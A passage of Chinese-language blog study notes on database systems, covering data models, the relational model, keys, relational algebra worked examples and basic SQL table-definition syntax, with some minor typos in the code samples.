href="#逻辑数据的独立性" class="headerlink" title="逻辑数据的独立性"></a>逻辑数据的独立性</h4><ul><li>当模式改变时，修改外模式（模式映像），使外模式保持不变，从而应用程序可以保持不变，称为数据的逻辑独立性</li></ul><h3 id="数据视图"><a href="#数据视图" class="headerlink" title="数据视图"></a>数据视图</h3><p><strong>物理层</strong>：描述数据存储</p><p><strong>逻辑层</strong>：描述存储在数据库中的数据，以及数据间的关系</p><p><strong>视图层</strong>：最高层次的抽象，只描述整个数据库的某部分数据。视图层提供了防止用户访问数据库的某些部分的安全性机制</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System\4.jpg" alt></p><p>如图，下图的COBOL和PL/I是由由逻辑层创建的两个视图，而最下面那个即是物理层所存放的数据</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System\5.jpg" alt></p><h3 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a>数据模型</h3><p><strong>数据库结构的基础是数据模型</strong></p><p>数据模型描述的内容：数据、数据关系、数据语义、数据约束</p><p>常用数据模型：关系模型、实体-联系数据模型（ER模型，主要用于数据库设计）、基于对象的数据模型（oo数据模型，面向对象和对象关系）、半结构化数据模型（XML，可扩展标记语言）、其他模型（如网状模型、层次模型）等</p><h3 id="数据库语言"><a href="#数据库语言" class="headerlink" title="数据库语言"></a>数据库语言</h3><ul><li>DML（Data Manipulaton Language）：操纵按照某种适当的数据模型组织起来的数据的语言<ul><li>查询</li><li>更新（增、删、改）</li></ul></li></ul><p>DML分类：①过程化：用户指定需要什么数据以及如何获得这些数据；②声明式（非过程化）：用户指定需要什么数据，而不指明如何获得这些数据</p><p>SQL是应用最广泛的DML</p><ul><li>DDL（Data Definition Language）：用于定义数据库模式以及其他特征的语言<ul><li>数据库模式</li><li>完整性约束：<ul><li>主键（ID，用来确定唯一的instructor）</li><li>参照完整性（SQL中的参照约束）</li></ul></li><li>断言</li><li>授权</li></ul></li></ul><p>DDL编译器产生一系列存储在<strong>数据字典</strong>中的表，数据字典包含元数据（元数据是关于数据的数据）</p><h3 id="关系数据库"><a href="#关系数据库" class="headerlink" title="关系数据库"></a>关系数据库</h3><p>SQL：是一门广泛使用的非过程化语言</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 例</span></span><br><span class="line"><span class="comment"># SQL-DML</span></span><br><span class="line"><span class="keyword">select</span> instructor.ID, department.building</span><br><span class="line"><span class="keyword">from</span> instructor, department</span><br><span class="line"><span class="keyword">where</span> instructor.dept_name = department.dept_name <span class="keyword">and</span></span><br><span class="line">44department.dept_nmae = <span class="string">'Physics'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># SQL-DDL</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> deptment(</span><br><span class="line">4dept_name <span class="built_in">char</span>(<span class="number">20</span>),</span><br><span class="line">    building <span class="built_in">char</span>(<span class="number">20</span>),</span><br><span class="line">    budget numberic(<span class="number">12</span>,<span class="number">2</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>来自应用程序的数据库访问：DML由宿主语言执行</p><h3 id="数据库设计"><a href="#数据库设计" class="headerlink" title="数据库设计"></a>数据库设计</h3><p>数据库设计的主要内容是数据库模式的设计</p><p>数据库设计过程：</p><ul><li>获取用户需求</li><li>概念设计</li><li>逻辑设计</li><li>物理设计</li></ul><p>现实世界是实体及其实体之间关系的集合</p><p>实体：现实世界中区别于其他对象的事情或物体，实体被一组属性所描述</p><p>关系：几个实体之间的关联</p><p>可以用实体关系图（entity-relationship diagram，E-R图）来表示</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System\6.jpg" alt></p><p>规范化：数据库设计的另外一种方法，目标是生成一个关系模式集合，是我们的存储信息是没有不必要的冗余，同时又能方便地检索数据</p><p>规范化最常用的方法就是使用函数依赖</p><p>规范化也提供了判定一个关系模式优劣的标准</p><h3 id="数据存储和查询"><a href="#数据存储和查询" class="headerlink" title="数据存储和查询"></a>数据存储和查询</h3><p>存储管理器是一个程序模块，提供了数据库中存储的低层数据与应用程序以及向系统提交的查询之间的接口</p><ul><li>存储管理器的任务<ul><li>与文件管理器交互</li><li>对数据的有效的存储、查询、更新</li></ul></li><li>存储管理器部件<ul><li>权限及完整性管理器</li><li>事务管理器</li><li>文件管理器</li><li>缓冲区管理器</li></ul></li></ul><h4 id="查询管理器"><a href="#查询管理器" class="headerlink" title="查询管理器"></a>查询管理器</h4><p>查询管理器的组件包括</p><ul><li>DDL解释器：他解释DDL语句，并将这些定义记录在数据字典中</li><li>DML编译器：将查询语言中的DML语句翻译成为一个执行方案</li><li>查询执行引擎：执行由DML编译器产生的低级指令</li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System\7.jpg" alt></p><ul><li>查询处理器的工作过程<ul><li>解析和转换</li><li>优化</li><li>计算</li></ul></li></ul><p>过程如下图</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System\8.jpg" alt></p><p>两方面来评估一个给定查询：①正则表达式②每个操作有不同的实现算法</p><p>需要估计操作的开销：关键取决于数据库需要维护的关系的统计信息；需要顾及中间结果的统计数据，从而计算复杂的表达式成本</p><h3 id="事务管理"><a href="#事务管理" class="headerlink" title="事务管理"></a>事务管理</h3><p><strong>事务</strong>是由一系列操作序列构成的程序执行单元，是一个不可分割的工作单位</p><p><strong>事务管理组件</strong>保证了当系统出现了故障（例如电源故障、操作系统崩溃）或事务失败时，数据库仍然保持一致性（正确性）</p><p><strong>并发控制管理器</strong>控制了并发事务间的相互影响，保证数据库的一致性</p><h3 id="数据库系统内部结构"><a href="#数据库系统内部结构" class="headerlink" title="数据库系统内部结构"></a>数据库系统内部结构</h3><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System\9.jpg" alt></p><h4 id="数据库体系结构"><a href="#数据库体系结构" class="headerlink" title="数据库体系结构"></a>数据库体系结构</h4><p>数据库系统的体系结构很大程度上取决于数据库系统所运行的计算机系统</p><ul><li>集中式</li><li>客户/服务器式<ul><li>远程数据库用户工作用的客户机（Clinet）</li><li>运行数据库系统的服务器（Server）</li></ul></li><li>并行（多处理器）<ul><li>并行系统通过并行地使用多个处理器和磁盘来提高处理速度和I/O速度</li></ul></li><li>分布式<ul><li>在分布式数据库系统中，数据库存储于几台计算机中，分布式系统中的计算机之间通过网络相互通信，他们不共享主存储器或磁盘</li></ul></li></ul><h3 id="数据挖掘"><a href="#数据挖掘" class="headerlink" title="数据挖掘"></a>数据挖掘</h3><p>数据挖掘式应用一系列技术从大型数据库或数据仓库中提取人们感兴趣的信息和知识，这些知识或信息式隐含的，实现未知而潜在有用的，提取的知识表示为概念、规则、规律、模式等形式</p><p>数据挖掘式一类深层次的数据分析</p><h3 id="数据库管理员"><a href="#数据库管理员" class="headerlink" title="数据库管理员"></a>数据库管理员</h3><p>对数据库系统进行集中控制的人称作数据库管理员（Database Administrator）</p><ul><li>DBA的作用<ul><li>模式定义</li><li>存储结构及存取方法定义</li><li>模式及物理组织的修改</li><li>数据访问授权</li><li>日常维护</li></ul></li></ul><h2 id="关系模型"><a href="#关系模型" class="headerlink" title="关系模型"></a>关系模型</h2><p>关系理论是建立在集合代数理论基础上的，有坚实的数学基础</p><h4 id="关系数据结构"><a href="#关系数据结构" class="headerlink" title="关系数据结构"></a>关系数据结构</h4><ul><li><p><strong>单一的数据结构——关系</strong>：现实世界中的实体及实体间的各种联系均用关系来表示</p></li><li><p><strong>数据的逻辑结构——二维表</strong>：从用户角度，关系模型中的数据的逻辑结构是一张二维表</p></li></ul><h4 id="属性的类型"><a href="#属性的类型" class="headerlink" title="属性的类型"></a>属性的类型</h4><ul><li><p>每个属性的可能的取值范围（集合）叫属性的<strong>域</strong></p></li><li><p>属性的值（通常）要求为<strong>原子的</strong>，也就是说，不可再分的</p><ul><li>属性的原子性问题要根据应用的需求确定</li></ul></li><li>null（空值）：是一个特殊的值，表示值未知或不存在<ul><li>空值给数据库访问和更新带来了很多困难</li></ul></li></ul><h3 id="关系的基本概念"><a href="#关系的基本概念" class="headerlink" title="关系的基本概念"></a>关系的基本概念</h3><h4 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h4><p>笛卡尔积D<sub>1</sub> × D<sub>2</sub> × … × D<sub>n</sub> 的子集叫做在域D<sub>1</sub>，D<sub>2</sub> ，…，D<sub>n</sub> 上的关系，用R(D<sub>1</sub>，D<sub>2</sub> ，…，D<sub>n</sub> )表示</p><p>R是关系的名字，n是关系的度或目</p><p>关系是笛卡尔积中有意义的子集</p><p>关系也可以表示为二维表</p><h4 id="关系模型和实例"><a href="#关系模型和实例" class="headerlink" title="关系模型和实例"></a>关系模型和实例</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">A1</span>,<span class="built_in">A2</span>,...,An 是属性</span><br><span class="line">R = (<span class="built_in">A1</span>,<span class="built_in">A2</span>,...,An) 是一个关系模式</span><br><span class="line">例:</span><br><span class="line"><span class="symbol">instructor</span> = (ID,name,dept_name,salary)</span><br><span class="line"></span><br><span class="line">形式上，给定集合<span class="built_in">D1</span>,<span class="built_in">D2</span>,...,<span class="meta">Dn</span>,一个关系r是<span class="built_in">D1</span>×<span class="built_in">D2</span>×...×<span class="meta">Dn</span> 的一个子集,因此,一个关系是一组n元组(<span class="built_in">a1</span>,<span class="built_in">a2</span>,...,an)的集合，其中ai ∈ Di</span><br></pre></td></tr></table></figure><p>关系的当前值（关系实例）可以用一个表指定</p><p>元素t是关系r中的一个元组，表中一行代表一个元组</p><ul><li>数据库由多个关系组成</li></ul><h3 id="码"><a href="#码" class="headerlink" title="码"></a>码</h3><ul><li><p><strong>码的作用</strong>：我们必须有一种能够区分给定关系中不同元组的方法。我们一般用元组中的属性表明，即一个元组的属性值必须是能够唯一区分元组的，一个关系中没有两个元组在所有属性上的取值都相同</p></li><li><p><strong>超码</strong>：超码是一个或者多个属性的集合，这些属性的组合可以使我们在一个关系中唯一地标识一个元组（例如，{ID}和{ID，name}都是instructor的超码）</p></li><li><p><strong>候选码</strong>：最小的超码称为候选码，即超码的任意真子集都不能成为超码（例如，{ID}是Instructor的一个候选码）</p></li><li><p><strong>主码</strong>：从一个关系的多个候选码中选定一个作为主码（习惯上把主码属性放在其他属性前面，并且加下划线）</p></li><li><p><strong>外码</strong>：一个关系模式r1可能在他的属性中包含另一个关系r2的主码，这个属性称作r1上参照r2的外码（r1和r2可以是同一个关系）</p><ul><li>关系r1称作外码依赖的参照关系</li><li>关系r2称作外码的被参照关系</li></ul></li></ul><h3 id="关系查询语言"><a href="#关系查询语言" class="headerlink" title="关系查询语言"></a>关系查询语言</h3><p>查询语言是用户用来从数据库中请求获取信息的语言</p><ul><li>广泛应用的查询语言：SQL</li><li>“纯”查询语言<ul><li>关系代数（过程化）</li><li>元组关系演算（非过程化）</li><li>域关系演算（非过程化）</li></ul></li></ul><h3 id="关系操作"><a href="#关系操作" class="headerlink" title="关系操作"></a>关系操作</h3><ul><li>基本操作<ul><li>一元运算<ul><li>选择、投影、更名</li></ul></li><li>多元运算<ul><li>笛卡尔积、并、集合差</li></ul></li></ul></li><li>其他运算<ul><li>集合交、θ连接，自然连接、除、赋值</li></ul></li></ul><p>自然连接：设r和s是关系模式R和S的实例，R和S关系实例的自然连接是关系模式R∪S的实例，遵守以下规则：①对于每一对元组 t<sub>r</sub> 和 t<sub>s</sub> ，其中 t<sub>r</sub>  来自r，t<sub>s</sub> 来自s；②如果 t<sub>r</sub> 和 t<sub>s</sub> 在属性组R∩S上的每个属性值都一样，添加一个元组t到结果集，其中 t由t<sub>r</sub> 在r上相同的值，t有 t<sub>s</sub> 在s上相同的值</p><p>笛卡尔积运算从两个关系中合并元组，但不同于连接运算的是，其结果包含来自两个关系元组的所有对，无论它们的属性是否匹配</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"># 选择元组</span><br><span class="line">Relation r:</span><br><span class="line"><span class="code">ABCD</span></span><br><span class="line"><span class="code">αα17</span></span><br><span class="line"><span class="code">αβ57</span></span><br><span class="line"><span class="code">ββ123</span></span><br><span class="line"><span class="code">ββ2310</span></span><br><span class="line"></span><br><span class="line">select tuples with A=B and D&gt;5</span><br><span class="line">σ A=B and D&gt;5 (r)</span><br><span class="line"></span><br><span class="line">ans:</span><br><span class="line"><span class="code">ABCD</span></span><br><span class="line"><span class="code">αα17</span></span><br><span class="line"><span class="code">ββ2310</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code"></span></span><br><span class="line">------------------------------</span><br><span class="line"></span><br><span class="line"># 选择列(属性)</span><br><span class="line"></span><br><span class="line">Relation r:</span><br><span class="line"><span class="code">ABC</span></span><br><span class="line"><span class="code">α101</span></span><br><span class="line"><span class="code">α201</span></span><br><span class="line"><span class="code">β301</span></span><br><span class="line"><span class="code">β402</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select A and C</span><br><span class="line"></span><br><span class="line">Projection</span><br><span class="line">Π A,C (r)</span><br><span class="line"></span><br><span class="line">ans:</span><br><span class="line"><span class="code">AC</span></span><br><span class="line"><span class="code">α1</span></span><br><span class="line"><span class="code">β1</span></span><br><span class="line"><span class="code">β2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------------------------</span><br><span class="line"></span><br><span class="line"># 连接两个关系</span><br><span class="line"># 笛卡尔积</span><br><span class="line"></span><br><span class="line">Relation r,s:</span><br><span class="line"><span class="code">r</span></span><br><span class="line"><span class="code">AB</span></span><br><span class="line"><span class="code">α1</span></span><br><span class="line"><span class="code">β2</span></span><br><span class="line"><span class="code">s</span></span><br><span class="line"><span class="code">CDE</span></span><br><span class="line"><span class="code">α10a</span></span><br><span class="line"><span class="code">β10a</span></span><br><span class="line"><span class="code">β20b</span></span><br><span class="line"><span class="code">γ10b</span></span><br><span class="line"></span><br><span class="line">r × s:</span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">ABCDE</span></span><br><span class="line"><span class="code">α1α10a</span></span><br><span class="line"><span class="code">α1β10a</span></span><br><span class="line"><span class="code">α1β20b</span></span><br><span class="line"><span class="code">α1γ10b</span></span><br><span class="line"><span class="code">β2α10a</span></span><br><span class="line"><span class="code">β2β10a</span></span><br><span class="line"><span class="code">β2β20b</span></span><br><span class="line"><span class="code">β2γ10b</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------------------------</span><br><span class="line"></span><br><span class="line"># 并运算</span><br><span class="line"></span><br><span class="line">Relation r,s:</span><br><span class="line"><span class="code">r</span></span><br><span class="line"><span class="code">AB</span></span><br><span class="line"><span class="code">α1</span></span><br><span class="line"><span class="code">α2</span></span><br><span class="line"><span class="code">β1</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">s</span></span><br><span class="line"><span class="code">AB</span></span><br><span class="line"><span class="code">α2</span></span><br><span class="line"><span class="code">β3</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">r ∪ s:</span><br><span class="line"><span class="code">AB</span></span><br><span class="line"><span class="code">α1</span></span><br><span class="line"><span class="code">α2</span></span><br><span class="line"><span class="code">β1</span></span><br><span class="line"><span class="code">β3</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"></span><br><span class="line">------------------------------</span><br><span class="line"></span><br><span class="line"># 差运算</span><br><span class="line"></span><br><span class="line">Relation r,s:</span><br><span class="line"><span class="code">r</span></span><br><span class="line"><span class="code">AB</span></span><br><span class="line"><span class="code">α1</span></span><br><span class="line"><span class="code">α2</span></span><br><span class="line"><span class="code">β1</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">s</span></span><br><span class="line"><span class="code">AB</span></span><br><span class="line"><span class="code">α2</span></span><br><span class="line"><span class="code">β3</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code"></span></span><br><span class="line">r - s: </span><br><span class="line"></span><br><span class="line"><span class="code">AB</span></span><br><span class="line"><span class="code">α1</span></span><br><span class="line"><span class="code">β1</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">------------------------------</span><br><span class="line"></span><br><span class="line"># 交运算</span><br><span class="line"></span><br><span class="line">Relation r,s:</span><br><span class="line"><span class="code">r</span></span><br><span class="line"><span class="code">AB</span></span><br><span class="line"><span class="code">α1</span></span><br><span class="line"><span class="code">α2</span></span><br><span class="line"><span class="code">β1</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">s</span></span><br><span class="line"><span class="code">AB</span></span><br><span class="line"><span class="code">α2</span></span><br><span class="line"><span class="code">β3</span></span><br><span class="line"></span><br><span class="line">r ∩ s:</span><br><span class="line"><span class="code">AB</span></span><br><span class="line"><span class="code">α2</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">------------------------------</span><br><span class="line"></span><br><span class="line"># 自然连接</span><br><span class="line"></span><br><span class="line">Relation r,s</span><br><span class="line"><span class="code">r</span></span><br><span class="line"><span class="code">ABCD</span></span><br><span class="line"><span class="code">α1αa</span></span><br><span class="line"><span class="code">β2γa</span></span><br><span class="line"><span class="code">γ4βb</span></span><br><span class="line"><span class="code">α1γa</span></span><br><span class="line"><span class="code">δ2βb</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">s</span></span><br><span class="line"><span class="code">BDE</span></span><br><span class="line"><span class="code">1aα</span></span><br><span class="line"><span class="code">3aβ</span></span><br><span class="line"><span class="code">1aγ</span></span><br><span class="line"><span class="code">2bδ</span></span><br><span class="line"><span class="code">3bε</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"></span><br><span class="line">Natural Join</span><br><span class="line">r ⋈s:</span><br><span class="line"><span class="code">ABCDE</span></span><br><span class="line"><span class="code">α1αaα</span></span><br><span class="line"><span class="code">α1αaγ</span></span><br><span class="line"><span class="code">α1γaα</span></span><br><span class="line"><span class="code">α1γaγ</span></span><br><span class="line"><span class="code">δ2βbδ</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------------------------</span><br><span class="line"></span><br><span class="line"># 连接两个关系</span><br><span class="line"># 笛卡尔积</span><br><span class="line"></span><br><span class="line">------------------------------</span><br></pre></td></tr></table></figure><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>SQL：Structured Query Language </p><p>商用系统一般支持sql-92的大部分特性，并支持后续的扩充标准中部分的扩充特性，以及系统特殊的自有特性</p><p>体系结构：user==(==&gt;view==&gt;table)==&gt;base table==&gt; stored file</p><table><thead><tr><th>SQL功能</th><th>操作符</th></tr></thead><tbody><tr><td>数据查询</td><td>Select</td></tr><tr><td>数据定义</td><td>Create、Alter、Drop</td></tr><tr><td>数据操纵</td><td>Insert、Update、Delete</td></tr><tr><td>数据控制</td><td>Grant、Revoke</td></tr></tbody></table><h3 id="数据定义"><a href="#数据定义" class="headerlink" title="数据定义"></a>数据定义</h3><p><strong>SQL的数据定义语言（DDL）</strong>能够定义每个关系的信息，包括①每个关系的模式；②每个属性的值域；③完整性约束；④将来的信息，如每个关系的索引集合，每个关系的安全性和权限信息，磁盘上每个关系的物理存储结构</p><h4 id="SQL的基本类型"><a href="#SQL的基本类型" class="headerlink" title="SQL的基本类型"></a><strong>SQL的基本类型</strong></h4><ul><li>char(n)：固定长度的字符串，用户指定长度n</li><li>varchar(n)：可变长度的字符串，用户指定最大长度n</li><li>int：整数类型（和机器相关的整数类型的有限子集）</li><li>smallint：小整数类型（和机器相关的整数类型的子集）</li><li>numeric(p,d)：定点数，精度由用户指定，这个数有p位数字，其中d位数字在小数点右边</li><li>real，double，precision：浮点数与双精度浮点数，精度与机器相关</li><li>float(n)：浮点数，精度由用户指定，精度至少为n位</li></ul><h4 id="创建表结构"><a href="#创建表结构" class="headerlink" title="创建表结构"></a>创建表结构</h4><p>使用<code>create table</code>命令创建一个SQL关系表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> r( A1 D1,</span><br><span class="line">4444A2 D2,</span><br><span class="line">4444...,</span><br><span class="line">4444An Dn)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r是关系名</span></span><br><span class="line"><span class="comment"># 每个Ai是关系模式r的一个属性名</span></span><br><span class="line"><span class="comment"># Di是属性Ai的域的类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#例</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> instructor(<span class="keyword">ID</span><span class="built_in">char</span>(<span class="number">5</span>),</span><br><span class="line">                        <span class="keyword">name</span><span class="built_in">varchar</span>(<span class="number">20</span>)<span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">                        dept_name<span class="built_in">varchar</span>(<span class="number">20</span>),</span><br><span class="line">                        salary<span class="built_in">numeric</span>(<span class="number">8</span>,<span class="number">2</span>) )</span><br><span class="line">    </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> instructor  </span><br><span class="line">   <span class="keyword">values</span> (‘<span class="number">10211</span>’, ’Smith’, ’Biology’, <span class="number">66000</span>);</span><br></pre></td></tr></table></figure><h5 id="Create-table中的完整性约束"><a href="#Create-table中的完整性约束" class="headerlink" title="Create table中的完整性约束"></a><code>Create table</code>中的完整性约束</h5><ul><li><code>not null</code> </li><li><code>primary key(A1,A2,...,An)</code></li><li><code>foreign key(Am,...,An) references r</code></li></ul><p>注：被声明为主码的属性自动被确保为<code>not null</code> </p><p>例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">create table instructor(</span><br><span class="line">444444IDchar(5),</span><br><span class="line">444444namevarchar(20)not null,</span><br><span class="line">444444dept_namevarchar(20),</span><br><span class="line">444444salarynumeric(8.2),</span><br><span class="line">444444primary key(ID),</span><br><span class="line">444444foreign key(dept_name) references department)</span><br><span class="line"></span><br><span class="line">create table takes(</span><br><span class="line">44444IDvarchar(5),</span><br><span class="line">44444course_idvarchar(8),</span><br><span class="line">44444sec_idvarchar(8),</span><br><span class="line">44444semestervarchar(6),</span><br><span class="line">44444yearnumeric(4,0),</span><br><span class="line">44444gradevarchar(2),</span><br><span class="line">44444primary key (ID,course_id,sec_id,semester,year),</span><br><span class="line">44444foreign key (ID) referencesstudent,</span><br><span class="line">44444)</span><br></pre></td></tr></table></figure><p>主码的声明和属性的声明可以放在一起，例如<code>course_id     varchar(8)  primary key,</code></p><h4 id="删除和更改表结构"><a href="#删除和更改表结构" class="headerlink" title="删除和更改表结构"></a>删除和更改表结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 删除表和他的内容</span><br><span class="line">drop table student</span><br><span class="line"></span><br><span class="line"># 删除表中的内容,但是保留表</span><br><span class="line">delete from student</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 更改表结构</span><br><span class="line">alter table</span><br><span class="line"></span><br><span class="line"># 属性A是关系r将要增加的属性,D是A的域</span><br><span class="line"># 对于关系r中的所有元组,在新增加的属性上的取值都为null</span><br><span class="line">alter table r add A D</span><br><span class="line"></span><br><span class="line"># A是关系r的一个属性名</span><br><span class="line"># 许多数据库不支持删除属性的操作</span><br><span class="line">alter table r drop A</span><br><span class="line"></span><br><span class="line"># 修改表中属性A的数据类型,将A的域改为D</span><br><span class="line"># 可能破坏原有的数据</span><br><span class="line">alter table r modify A D</span><br></pre></td></tr></table></figure><h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h4><p>建立索引是加快查询速度的有效手段</p><p>建立索引：由DBA或表的属主（建立表的人）根据需要建立索引；或者有些DBMS自动建立特定列上（Primary key，unique）的索引</p><p>维护索引：DBMS自动完成</p><p>使用索引：DBMS自动选择是否使用索引以及使用哪些索引</p><p>定义的格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">create[unique | distinct][cluster]indexindex_name</span><br><span class="line">44on table_name(col_name[asc | desc][,col_name asc|desc,...])</span><br><span class="line"># 